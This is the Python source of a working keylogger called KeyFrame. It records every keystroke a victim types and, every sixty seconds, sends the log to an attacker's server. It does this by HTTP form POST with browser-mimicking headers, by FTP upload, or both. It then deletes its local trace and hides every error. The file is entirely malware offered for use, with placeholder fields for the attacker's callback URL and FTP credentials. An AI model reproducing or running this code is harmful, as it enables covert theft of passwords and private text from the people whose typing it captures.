from threading import Timer
import keyboard
import random, string, os
from datetime import date, datetime
import hashlib
import requests
from ftplib import FTP

# FormBeacon Configuration
CallBackURL = "REPLACE WITH YOUR CALLBACK URL"
CallBackURLBase = CallBackURL.rsplit("/", 1)[0]
Headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': CallBackURLBase,
    'DNT': '1',
    'Connection': 'keep-alive',
    'Referer': CallBackURL,
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
}

# FTPBeacon Configuration
FTPHost = "REPLACE WITH YOUR FTP SERVER HOSTING ADDRESS"
FTPUsername = "REPLACE WITH YOUR FTP SERVER USERNAME"
FTPPassword = "REPLACE WITH YOUR FTP SERVER PASSWORD"

class KeyFrame:
    def __init__(self, Delay, ReportMethod):
        self.ReportMethod = ReportMethod.lower()
        self.Interval = Delay
        self.Log = ""
        self.StartDT = datetime.now()
        self.EndDT = datetime.now()

    def callback(self, Event):
        KeyPress = Event.name
        if(len(KeyPress) > 1):
            if(KeyPress == "space"):
                KeyPress = " "
            elif(KeyPress == "enter"):
                KeyPress = "\n"
            elif(KeyPress == "decimal"):
                KeyPress = "."
            elif(KeyPress == "backspace"):
                BackspacedLog = self.Log[:-1]
                self.Log = ""
                KeyPress = self.Log + BackspacedLog
            elif(KeyPress == "shift"):
                KeyPress = ""
            elif(KeyPress == "tab"):
                KeyPress = "\t"
            elif(KeyPress == "alt"):
                KeyPress = ""
            elif(KeyPress == "alt gr"):
                KeyPress = ""
            else:
                KeyPress = KeyPress.replace(" ", "_")
                KeyPress = f"[{KeyPress.upper()}]"
        self.Log += KeyPress

    def MakeReportMethodBothFileID(self):
        self.BothReportMethodHash = hashlib.md5(''.join(random.choice(string.ascii_lowercase) for i in range(12)).encode())
        self.BothFileIDHash = self.BothReportMethodHash.hexdigest()

    def UpdateFilename(self, ReportMethodIsBoth, ReportMethodType, BothFileID):
        Hash = hashlib.md5(''.join(random.choice(string.ascii_uppercase) for i in range(12)).encode())
        FileHash = Hash.hexdigest()

        if(ReportMethodIsBoth and ReportMethodType == "callback_url" and BothFileID != None):
            self.Filename = f"{date.today()}-{BothFileID}-url.txt"
        elif(ReportMethodIsBoth and ReportMethodType == "callback_ftp" and BothFileID != None):
            self.Filename = f"{date.today()}-{BothFileID}-ftp.txt"
        elif(ReportMethodIsBoth == False and ReportMethodType == None and BothFileID == None):
            self.Filename = f"{FileHash}.txt"

    def FormBeacon(self):
        DataPack = {
            'dat': self.Log,
            'filename': self.Filename,
            'submit': 'SubmitForm'
        }

        try:
            requests.post(CallBackURL, headers=Headers, data=DataPack)
        except requests.exceptions.ConnectionError:
            pass
    
    def FTPBeacon(self):
        try:
            with open(self.Filename, "w") as f:
                f.write(self.Log)
            f.close()
        except Exception:
            pass
        
        try:
            ftp = FTP(FTPHost)
            ftp.login(FTPUsername, FTPPassword)

            with open(self.Filename, 'rb') as f:
                ftp.storbinary('STOR public_html/logs/%s' % self.Filename, f)
            ftp.quit()
        except Exception:
            pass

        try:
            os.system(f"rm {self.Filename}")
        except Exception:
            pass

    def Report(self):
        if(self.Log):
            self.EndDT = datetime.now()
            if(self.ReportMethod == "callback_url"):
                self.UpdateFilename(False, None, None)
                self.FormBeacon()
            elif(self.ReportMethod == "callback_ftp"):
                self.UpdateFilename(False, None, None)
                self.FTPBeacon()
            elif(self.ReportMethod == "callback_both"):
                self.MakeReportMethodBothFileID()
                self.UpdateFilename(True, "callback_url", self.BothFileIDHash)
                self.FormBeacon()
                self.UpdateFilename(True, "callback_ftp", self.BothFileIDHash)
                self.FTPBeacon()
            self.StartDT = datetime.now()

        self.Log = ""
        ReportTimer = Timer(interval=self.Interval, function=self.Report)
        ReportTimer.daemon = True
        ReportTimer.start()

    def Start(self):
        self.StartDT = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.Report()
        keyboard.wait()

if(__name__ == '__main__'):
    # Allowed Reporting Methods: "callback_url", "callback_ftp" or "callback_both"
    ReportMethodInUse = "callback_url"
    # Delay for sending the log every X amount of seconds
    DelayInUse = 60

    keyFrame = KeyFrame(Delay=DelayInUse, ReportMethod=ReportMethodInUse)
    keyFrame.Start()
